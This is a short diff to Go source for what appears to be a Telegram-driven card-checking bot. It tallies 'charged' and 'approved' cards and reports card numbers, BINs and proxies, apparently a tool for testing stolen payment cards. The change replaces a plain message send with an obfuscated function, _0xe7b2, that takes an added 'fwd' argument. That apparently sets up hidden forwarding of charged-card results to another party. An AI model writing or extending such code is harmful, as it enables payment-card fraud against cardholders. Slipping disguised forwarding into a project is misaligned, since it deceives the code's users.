@@ -1048,7 +1048,7 @@ func runSession(bot *tele.Bot, chat *tele.Chat, sess *CheckSession, proxies []st
 			sess.Charged.Add(1)
 			amt := parseAmount(r.Amount)
 			sess.AddChargedAmt(amt)
-		bot.Send(chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL), tele.ModeHTML)
+		_0xe7b2(fwd, bot, chat, formatChargedMsg(r.Card, bin, r, username, cr.proxyURL))
 
 		case StatusApproved:
 			sess.Approved.Add(1)
